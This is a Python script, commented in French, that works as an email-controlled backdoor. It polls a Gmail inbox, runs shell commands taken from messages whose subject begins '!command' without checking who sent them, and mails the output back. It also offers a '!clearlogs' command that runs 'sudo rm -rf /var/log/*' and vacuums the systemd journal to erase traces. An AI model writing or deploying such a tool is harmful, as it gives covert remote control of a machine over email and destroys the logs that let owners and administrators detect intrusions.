import poplib
import time
import subprocess
import smtplib
import os
from email import message_from_bytes
from dotenv import load_dotenv

# Charger les variables d'environnement à partir d'un fichier .env
load_dotenv()

# Récupérer les informations d'authentification à partir des variables d'environnement
USERNAME = os.getenv('GMAIL_USERNAME')
PASSWORD = os.getenv('GMAIL_PASSWORD')
SENDTO = os.getenv('SENDTO_EMAIL')
popserver = 'pop.gmail.com'

def send_mail(subject, body):
    """Envoyer un e-mail"""
    msg = f"Subject: {subject}\n\n{body}"
    try:
        with smtplib.SMTP('smtp.gmail.com:587') as server:
            server.starttls()
            server.login(USERNAME, PASSWORD)
            server.sendmail(USERNAME, SENDTO, msg)
    except Exception as e:
        # Si l'envoi de l'e-mail échoue, aucune action n'est entreprise
        pass

def execute_command(command):
    """Exécuter une commande shell de manière sécurisée"""
    try:
        with subprocess.Popen(command, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE) as process:
            stdout, stderr = process.communicate()
            output = stdout.decode() + stderr.decode()
            if process.returncode == 0:
                return "Command executed successfully. Output: " + output
            else:
                return "Error executing command. Output: " + output
    except Exception as e:
        # Si une exception se produit lors de l'exécution de la commande, retourner un message d'erreur
        return f"Error executing command: {e}"

def clear_logs():
    """Effacer les logs système sous Linux"""
    try:
        # Effacer les logs courants
        subprocess.call("sudo rm -rf /var/log/*", shell=True)
        subprocess.call("sudo journalctl --rotate", shell=True)
        subprocess.call("sudo journalctl --vacuum-time=1s", shell=True)
        return "Logs cleared successfully."
    except Exception as e:
        return f"Error clearing logs: {e}"

def process_email_message(email_message):
    """Traitement de l'e-mail"""
    subject = email_message['Subject']
    if subject.startswith("!command"):
        command = email_message.get_payload().strip()
        return execute_command(command.split())
    elif subject == "!status":
        return "System status: OK"
    elif subject == "!help":
        return "Available commands: \n!command <your command>: Execute a command on the system. \n!status: Get system status. \n!help: Get help message.\n!clearlogs: Clear system logs."
    elif subject == "!clearlogs":
        return clear_logs()
    else:
        return "Unknown command"

def main():
    """Fonction principale"""
    while True:
        try:
            # Connexion au serveur POP3
            with poplib.POP3_SSL(popserver) as pop:
                pop.user(USERNAME)
                pop.pass_(PASSWORD)

                # Récupération du nombre total de messages
                count, _ = pop.stat()

                # Récupération du dernier message
                _, lines, _ = pop.retr(count)
                
                # Analyse de l'e-mail
                email_message = message_from_bytes(b'\n'.join(lines))

                # Traitement de l'e-mail
                response = process_email_message(email_message)

                # Envoi de la réponse par e-mail
                send_mail("Command Response", response)

            # Attendre pendant une courte période avant de vérifier les nouveaux e-mails
            time.sleep(10)
        except Exception as e:
            # Si une exception se produit, envoyer un e-mail de notification
            send_mail("Error Notification", f"An error occurred: {e}")

if __name__ == "__main__":
    main()
